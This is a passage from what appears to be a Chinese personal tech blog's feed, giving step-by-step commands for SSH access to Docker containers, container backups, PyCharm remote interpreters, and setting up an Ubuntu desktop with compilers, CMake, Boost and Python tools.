/etc/ssh/sshd_config<br><span class="hljs-comment"># 将session\s*required\s*pam_loginuid.so 替换为 session optional pam_loginuid.so</span><br>$ sed <span class="hljs-string">'s@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g'</span> -i /etc/pam.d/sshd<br><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">"export VISIBLE=now"</span> &gt;&gt; /etc/profile<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ sudo service ssh restart<br></code></pre></div></td></tr></table></figure></blockquote><p>在服务器（宿主机）上</p><blockquote><p>测试刚刚新建docker容器中端口转发的22端口：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ sudo docker port [your_container_name] 22<br></code></pre></div></td></tr></table></figure></blockquote><p>NOTE：可能ssh默认开启的端口不是22，需要在/etc/ssh/sshd_config中修改port 为 22</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -tnlp   <span class="hljs-comment"># 查看当前机器开启的端口</span><br></code></pre></div></td></tr></table></figure><p>测试能否用SSH连接到远程docker：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ssh root@[your_host_ip] -p 8000<br></code></pre></div></td></tr></table></figure><p>下面就可以通过pychram和jupyter远程连接服务器上的docker了</p><p>本地与服务器的端口映射，从而远程登录jupyter：(远程链接到宿主机被映射的端口)：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh username@host-ip -L 8888:127.0.0.1:9999<br></code></pre></div></td></tr></table></figure><p>远程可通过宿主机ip的8888端口访问jupyter</p><p>docker重启时也需要重启ssh服务：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ sudo service ssh restart<br></code></pre></div></td></tr></table></figure><hr><h4><span id="备份">备份</span></h4><p>通过<code>docker ps</code>或者<code>docker ps -a</code>来查看你想备份的容器的id，然后通过：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker commit -p [your-container-id] [your-backup-name]<br></code></pre></div></td></tr></table></figure><p>来将your-container-id的容器创建成一个镜像快照</p><p>通过<code>docker images</code>就可以查看到刚刚创建好的镜像快照了</p><p>通过：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker save -o [path-you-want-to-save/your-backup-name.tar]] [your-backup-name]<br></code></pre></div></td></tr></table></figure><p>把那个镜像打包成tar文件，保存到服务器上。</p><p>恢复： <code>docker load -i your-backup-name.tar</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker run -d -p 80:80 your-backup-name<br></code></pre></div></td></tr></table></figure><hr><h4><span id="pycharm连接">pycharm连接</span></h4><p>PyCharm<code>*Tools &gt; Deployment &gt; Configuration*</code>,新建一个<code>*SFTP*</code>服务器，名字自己取</p><figure><img src="/images/分布式环境.assets/image-20200412235440785.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>输入如下图配置</p><figure><img src="/images/分布式环境.assets/image-20200412235554201.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>在<em>Mappings</em>中配置路径，这里的路径是你本地存放代码的路径，与刚刚配置的<em>RootPath</em>相互映射（同docker中宿主机与容器的关系）</p><figure><img src="/images/分布式环境.assets/image-20200412235839399.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p><strong>配置远程解释器</strong></p><p>点击PyCharm的<em>File &gt; Setting &gt; Project &gt; ProjectInterpreter</em>右边的设置按钮新建一个项目的远程解释器：</p><figure><img src="/images/分布式环境.assets/image-20200413000018058.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="/images/分布式环境.assets/image-20200413000036658.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>配置完成。配置完成以后需要等本地和远程的环境同步一下。</p><p>本地的文件，修改之后可以随时右键deployment-&gt;upload到远程主机，或者直接在本地调试运行。</p><p>docker容器停了以后里面的SSH服务也会相应停止，</p><p>docker重启时也需要重启ssh服务：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ service ssh restart<br></code></pre></div></td></tr></table></figure><hr><p>参考： <a href="https://zhuanlan.zhihu.com/p/112267407">Docker中搭建深度学习环境</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
            <tag> NVIDIA Container Toolkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人Linux环境配置</title>
      <link href="/posts/2c27ec14.html"/>
      <url>/posts/2c27ec14.html</url>
      
        <content type="html"><![CDATA[<h3><span id="更新源"><strong>更新源</strong></span></h3><p>找到Software &amp; Updates，将源更新为阿里云的源</p><p>在Other Software里将Canonical Partners勾上</p><p>然后自己手动更新一下：</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">sudo</span> <span class="hljs-string">apt update</span><br><br><span class="hljs-attr">sudo</span> <span class="hljs-string">apt upgrade</span><br></code></pre></div></td></tr></table></figure><h3><span id="sougou-pinyin"><strong>Sougou Pinyin</strong></span></h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">sudo apt-get <span class="hljs-keyword">install</span> fcitx-<span class="hljs-keyword">bin</span><br><br>sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> fcitx-<span class="hljs-keyword">table</span> <br><br><span class="hljs-comment"># 搜狗输入法Linux官网 https://pinyin.sogou.com/linux/ 下载64bit的程序</span><br>sudo dpkg -i sogoupinyin*.deb<br></code></pre></div></td></tr></table></figure><p>重启</p><p>找到Fcitx Configure，设置输入法</p><h3><span id="截图软件-shutter"><strong>截图软件 Shutter</strong></span></h3><p>下载<a href="https://launchpad.net/ubuntu/+archive/primary/+files/libgoocanvas-common_1.0.0-1_all.deb">libgoocanvas-common</a>、<a href="https://launchpad.net/ubuntu/+archive/primary/+files/libgoocanvas3_1.0.0-1_amd64.deb">libgoocanvas3</a>、<a href="https://launchpad.net/ubuntu/+archive/primary/+files/libgoo-canvas-perl_0.06-2ubuntu3_amd64.deb">libgoo-canvas-perl</a></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">sudo dpkg -<span class="hljs-selector-tag">i</span> libgoocanvas-common*.deb<br><br>sudo dpkg -<span class="hljs-selector-tag">i</span> libgoocanvas3*.deb<br><br>sudo dpkg -<span class="hljs-selector-tag">i</span> libgoo-canvas-perl*deb<br></code></pre></div></td></tr></table></figure><p>将上述三个包给安装上，若安装失败，执行下面代码:</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install -f<br></code></pre></div></td></tr></table></figure><p>然后再安装这几个包</p><h3><span id="视频和音频"><strong>视频和音频</strong></span></h3><p>安装解码器：</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install ubuntu-restricted-extras<br></code></pre></div></td></tr></table></figure><p>安装VLC视频播放器</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install vlc browser-plugin-vlc<br></code></pre></div></td></tr></table></figure><p>安装FFmpeg</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install ffmpeg<br></code></pre></div></td></tr></table></figure><p>网易云音乐 <a href="https://music.163.com/#/download" target="_blank" rel="noopener">官网</a></p><h3><span id="设置-点击图标最小化"><strong>设置: 点击图标最小化</strong></span></h3><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">gsettings set org<span class="hljs-selector-class">.gnome</span><span class="hljs-selector-class">.shell</span><span class="hljs-selector-class">.extensions</span><span class="hljs-selector-class">.dash-to-dock</span> click-action <span class="hljs-string">'minimize'</span><br></code></pre></div></td></tr></table></figure><h3><span id="美化">美化</span></h3><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">sudo apt-get <span class="hljs-keyword">install</span> gnome-tweak-tool   <span class="hljs-comment">#安装tweak</span><br><br>sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> gnome-shell-extensions -y  <span class="hljs-comment">#安装shell扩展</span><br><br>sudo apt <span class="hljs-keyword">install</span> chrome-gnome-shell     <span class="hljs-comment">#为了能在浏览器内安装gnome插件，火狐和谷歌都能用</span><br><br>sudo apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> gtk2-<span class="hljs-keyword">engines</span>-pixbuf    <span class="hljs-comment">#防止GTK2错误</span><br><br>sudo apt <span class="hljs-keyword">install</span> libxml2-utils<br></code></pre></div></td></tr></table></figure><p>从<a href="https://www.gnome-look.org/browse/ord/top/">gnome-look</a>这里下载，或者通过<a href="https://www.pling.com/p/1175480/">pling</a>和 <a href="https://www.opendesktop.org/p/1136805/">ocs-url</a>直接安装</p><blockquote><p>或者手动下载下来，接下来解压到指定文件夹，并安装他们。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">xz -d Gnome-OSC-HS-light-menu*<span class="hljs-string">.tar.xz</span><br><br>tar -xvf Gnome-OSC-HS-light-menu*<span class="hljs-string">.tar</span> -C <span class="hljs-string">/usr/share/themes/</span><br><br>xz -d Gnome-OSC-HS<span class="hljs-params">--2</span>*<span class="hljs-string">.tar.xz</span><br><br>tar -xvf Gnome-OSC-HS<span class="hljs-params">--2</span>*<span class="hljs-string">.tar</span> -C <span class="hljs-string">/usr/share/themes/</span><br></code></pre></div></td></tr></table></figure><p>图标：/usr/share/icons/</p><p>其他主题：/usr/share/themes/</p></blockquote><p>如果Shell显示不可修改，</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">sudo apt install gnome-<span class="hljs-keyword">shell</span><span class="bash">-extensions</span><br></code></pre></div></td></tr></table></figure><h3><span id="安装压缩软件"><strong>安装压缩软件</strong></span></h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">sudo apt-<span class="hljs-keyword">get</span> install p7zip-<span class="hljs-keyword">full</span> p7zip-rar rar unzip<br></code></pre></div></td></tr></table></figure><h3><span id="chrome-brower"><strong>Chrome Brower</strong></span></h3><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb<br><br>sudo dpkg -i google-chrome*; <span class="hljs-attribute">sudo</span> apt-get -f install<br></code></pre></div></td></tr></table></figure><h3><span id="安装多版本gcc和g并共存"><strong>安装多版本gcc和g++，并共存</strong></span></h3><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">sudo apt-<span class="hljs-keyword">get</span> install gcc<span class="hljs-number">-5</span> gcc<span class="hljs-number">-5</span>-multilib<br><br>sudo apt-<span class="hljs-keyword">get</span> install g++<span class="hljs-number">-5</span> g++<span class="hljs-number">-5</span>-multilib<br><br>sudo apt-<span class="hljs-keyword">get</span> install gcc<span class="hljs-number">-6</span> gcc<span class="hljs-number">-6</span>-multilib<br><br>sudo apt-<span class="hljs-keyword">get</span> install g++<span class="hljs-number">-6</span> g++<span class="hljs-number">-6</span>-multilib<br><br>sudo apt-<span class="hljs-keyword">get</span> install gcc<span class="hljs-number">-7</span> gcc<span class="hljs-number">-7</span>-multilib<br><br>sudo apt-<span class="hljs-keyword">get</span> install g++<span class="hljs-number">-7</span> g++<span class="hljs-number">-7</span>-multilib<br><br>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc<span class="hljs-number">-5</span> <span class="hljs-number">50</span><br><br>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc<span class="hljs-number">-6</span> <span class="hljs-number">60</span><br><br>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc<span class="hljs-number">-7</span> <span class="hljs-number">70</span><br><br>sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++<span class="hljs-number">-5</span> <span class="hljs-number">50</span><br><br>sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++<span class="hljs-number">-6</span> <span class="hljs-number">60</span><br><br>sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++<span class="hljs-number">-7</span> <span class="hljs-number">70</span><br></code></pre></div></td></tr></table></figure><p>然后选择gcc和g++版本</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">sudo <span class="hljs-keyword">update</span>-alternatives <span class="hljs-comment">--config gcc</span><br><br>sudo <span class="hljs-keyword">update</span>-alternatives <span class="hljs-comment">--config g++</span><br></code></pre></div></td></tr></table></figure><h3><span id="cmake">CMAKE</span></h3><p>https://cmake.org/download/</p><p>安装在/opt下，软连接到/usr/bin/</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/opt/</span>cmake-<span class="hljs-number">3.17</span>.<span class="hljs-number">1</span><span class="hljs-regexp">/bin/</span>* <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/</span><br></code></pre></div></td></tr></table></figure><p>complete cmake process with followinglibs:(boost版本较低，需要手动安装较高版本，见下文Boost部分)</p><figure class="highlight q"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install cmake libblkid-<span class="hljs-built_in">dev</span> e2fslibs-<span class="hljs-built_in">dev</span> libboost-<span class="hljs-built_in">all</span>-<span class="hljs-built_in">dev</span> libaudit-<span class="hljs-built_in">dev</span><br></code></pre></div></td></tr></table></figure><p>openSSL</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libssl-dev<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>编写简单的cmake</strong></p><p>https://cmake.org/cmake/help/v3.17/guide/tutorial/index.html</p><p>使用cmake首先得有个CMakeList.txt文件，你需要把配置信息写在该文件中，然后通过cmake去处理该文件。将设有下面一个main.cpp文件</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">//main.cpp文件</span><br>\<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"hello world!"</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这时候我们就可以写个如下的CMakeList.txt文件</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">\#cmake最小需要版本<br><span class="hljs-function"><span class="hljs-title">cmake_minimum_required</span><span class="hljs-params">(VERSION <span class="hljs-number">2.8</span>)</span></span><br><br>\#项目名字<br><span class="hljs-function"><span class="hljs-title">project</span><span class="hljs-params">(HELLOWORLD)</span></span><br><br>\#包含原程序,即把给定目录下的源程序复制给变量DIR_SRC<br><span class="hljs-function"><span class="hljs-title">aux_source_directory</span><span class="hljs-params">(DIR_SRC ./)</span></span><br><br>\#生成程序<br><span class="hljs-function"><span class="hljs-title">add_executable</span><span class="hljs-params">(helloworld $&#123;DIR_SRC&#125;)</span></span><br></code></pre></div></td></tr></table></figure><p>然后执行如下命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">mkdir build<br><span class="hljs-keyword">cd</span> build<br>cmake <span class="hljs-string">..</span><br>make<br><span class="hljs-string">./helloworld</span><br></code></pre></div></td></tr></table></figure><p>这样就编译好程序并运行。</p><p>添加静态库或者动态库</p><p>而假设我们程序用到了在/usr/lib下的一个静态库libmy.a，那就需要添加如下两个命令</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">\#库所在位置<br>link<span class="hljs-constructor">_directories(<span class="hljs-operator">/</span><span class="hljs-params">usr</span><span class="hljs-operator">/</span><span class="hljs-params">lib</span>)</span><br><br>\#程序编译时候链接库<br>target<span class="hljs-constructor">_link_libraries(<span class="hljs-params">helloworld</span> <span class="hljs-params">my</span>)</span><br></code></pre></div></td></tr></table></figure></blockquote><h3><span id="boost">Boost</span></h3><p>下载https://www.boost.org/users/history/version_1_72_0.html</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">sudo tar -zxvf boost_1_72_0<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> -C /usr/local/<br></code></pre></div></td></tr></table></figure><p>Boost库的编译安装还有一些依赖库，需要先安装</p><figure class="highlight q"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install mpi-default-<span class="hljs-built_in">dev</span> libicu-<span class="hljs-built_in">dev</span> python-<span class="hljs-built_in">dev</span> libbz2-<span class="hljs-built_in">dev</span><br></code></pre></div></td></tr></table></figure><p>回到boost库的路径下，运行如下命令</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sudo <span class="hljs-string">./bootstrap.sh</span><br>sudo <span class="hljs-string">./b2</span> install <span class="hljs-params">--prefix=/usr</span> <span class="hljs-params">--build-dir=tmp/build-boost</span><br></code></pre></div></td></tr></table></figure><p>--prefix后面跟的是你安装boost库的路径，安装完成后所有的头文件和lib库都会保存在这个路径下</p><blockquote><p>若 ./b2不加 install --prefix=/usr会编译到当前文件夹下，安装没有链接成功，因此手动链接。</p><figure class="highlight crystal"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crystal">sudo ln -sf /usr/local/boost_1_72_0/boost/* <span class="hljs-regexp">/usr/include</span><span class="hljs-regexp">/boost/include</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">sudo ln -sf /usr</span><span class="hljs-regexp">/local/boost</span>_1_72_0/stage/<span class="hljs-class"><span class="hljs-keyword">lib</span>/* /<span class="hljs-title">usr</span>/<span class="hljs-title">include</span>/<span class="hljs-title">boost</span>/<span class="hljs-title">lib</span>/</span><br></code></pre></div></td></tr></table></figure><p>然后加入环境变量/etc/profile</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">export env=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/include/boost</span><br></code></pre></div></td></tr></table></figure></blockquote><blockquote><p><strong>只是用头文件示例程序</strong></p><p>不需要先编译boost，直接引入头文件就行。</p><p>这个程序用到了boost提供的正则匹配库</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;boost/regex.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> line;<br> <span class="hljs-function">boost::regex <span class="hljs-title">pat</span><span class="hljs-params">(<span class="hljs-string">"tcp:*"</span>)</span></span>;<br> <br> <span class="hljs-keyword">while</span>(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>)<br> &#123;<br>     <span class="hljs-built_in">std</span>::getline(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, line);<br>     boost::smatch matches;<br>     <br>     <span class="hljs-keyword">if</span>(boost::regex_match(line, matches, pat))<br>         <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; matches[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br> &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>依旧通过CMake进行编译</p><ul><li>首先设置Boost库的路径，也就是之前的安装路径</li><li>然后使用find_package来搜索这个路径下面是否有需要的regex库</li><li>最后设置头文件搜索路径以及把找到的库link到应用程序</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">project(tutorial-0)<br>cmake_minimum_required(VERSION 3.5)<br><span class="hljs-built_in">set</span>(CMAKE_CXX_STANDARD 14)<br><br><span class="hljs-built_in">set</span>(BOOST_ROOT /usr/<span class="hljs-built_in">local</span>/boost_1_72_0)<br><br>find_package(Boost COMPONENTS regex REQUIRED)<br><br><span class="hljs-keyword">if</span>(Boost_FOUND)<br>    include_directories(<span class="hljs-variable">$&#123;Boost_INCLUDE_DIRS&#125;</span>)<br><br>    add_executable(foo foo.cpp)<br>    target_link_libraries (foo <span class="hljs-variable">$&#123;Boost_LIBRARIES&#125;</span>)<br>endif()<br></code></pre></div></td></tr></table></figure><p>编译完成后运行app查看结果</p></blockquote><h3><span id="多版本python和pip共存">多版本python和pip共存</span></h3><p>ubuntu18.04自带python3，但是没有python2，pip2，pip3</p><figure class="highlight dsconfig"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo </span><span class="hljs-string">apt </span><span class="hljs-string">install </span><span class="hljs-string">curl</span><br><span class="hljs-string">sudo </span><span class="hljs-string">apt-get </span><span class="hljs-string">install </span><span class="hljs-string">python3-distutils</span><br><span class="hljs-string">sudo </span><span class="hljs-string">apt-get </span><span class="hljs-string">install </span><span class="hljs-string">python3-testresources</span><br><span class="hljs-string">sudo </span><span class="hljs-string">apt-get </span><span class="hljs-string">install </span><span class="hljs-string">python3-widgetsnbextension</span><br><span class="hljs-string">sudo </span><span class="hljs-string">apt </span><span 